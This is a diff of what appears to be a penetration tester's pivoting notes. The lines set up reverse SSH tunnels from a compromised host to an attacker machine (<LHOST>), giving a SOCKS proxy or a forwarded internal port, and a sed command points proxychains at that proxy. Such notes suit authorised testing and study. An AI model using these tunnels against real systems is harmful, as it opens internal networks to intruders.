@@ -20,7 +20,8 @@ ssh -N -o StrictHostKeyChecking=no -R 1080 tunnel@<LHOST>
 An internal service on a Kali port:
 ssh -N -o StrictHostKeyChecking=no -R <LPORT>:<InternalIP>:<Port> tunnel@<LHOST>
 - [ ] The password prompt needs a real console: from a plain reverse shell, plink instead
-- [ ] socks5 127.0.0.1 1080 as the last line of /etc/proxychains4.conf, as in :Pb chisel
+Kali's proxychains points at Tor's port; this makes it use the proxy instead:
+sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
 
 ## plink
 Kali ships it. Into the target's upload/ folder, then fetched with the line serve files prints:
